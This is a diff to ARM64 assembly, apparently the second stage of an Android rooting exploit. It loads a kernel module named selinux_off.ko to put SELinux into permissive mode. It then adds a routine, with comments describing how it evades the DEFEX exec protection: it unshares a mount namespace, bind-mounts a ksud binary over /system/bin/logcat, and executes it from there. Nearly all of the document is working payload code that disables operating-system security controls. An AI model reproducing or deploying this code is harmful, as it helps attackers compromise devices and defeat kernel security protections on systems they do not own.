@@ -161,6 +161,10 @@ shelld:
     .asciz "/data/data/org.lsposed.lspromise/ksud"
 shelld_arg:
     .asciz "late-load"
+root_path:
+    .asciz "/"
+sysbin:
+    .asciz "/system/bin/logcat"
     .align 4
 
 stage2_start:
@@ -204,19 +208,50 @@ matched:
     mov     x8, #SYS_openat
     svc     0
 
-    // finit_module
+    // finit_module -> loads selinux_off.ko, SELinux goes permissive
     adr x1, mod_args
     mov x2, xzr
     mov     x8, #273
     svc 0
 
-    sub sp, sp, 48
+    // --- DEFEX-safe ksud exec ------------------------------------------
+    // DEFEX kills execve() of a binary under /data even from this
+    // privileged context, so ksud never starts. Bind the ksud copy over a
+    // system binary in a private mount namespace and exec THAT path instead
+    // (system paths are exec-allowed). Same trick the GhostLock helper uses.
+
+    // unshare(CLONE_NEWNS)
+    mov x0, #CLONE_NEWNS
+    mov x8, #SYS_unshare
+    svc 0
+
+    // mount(NULL, "/", NULL, MS_REC|MS_PRIVATE, NULL)
+    mov x0, xzr
+    adr x1, root_path
+    mov x2, xzr
+    mov x3, #MS_REC
+    orr x3, x3, #MS_PRIVATE
+    mov x4, xzr
+    mov x8, #SYS_mount
+    svc 0
+
+    // mount(shelld, sysbin, NULL, MS_BIND, NULL)
     adr x0, shelld
+    adr x1, sysbin
+    mov x2, xzr
+    mov x3, #MS_BIND
+    mov x4, xzr
+    mov x8, #SYS_mount
+    svc 0
+
+    // execve(sysbin, {sysbin, "late-load", NULL}, NULL)
+    sub sp, sp, 48
+    adr x0, sysbin
     str x0, [sp]
     adr x0, shelld_arg
     str x0, [sp, 8]
     str xzr, [sp, 16]
-    adr x0, shelld
+    adr x0, sysbin
     mov x1, sp
     mov x2, xzr
     mov x8, #SYS_execve
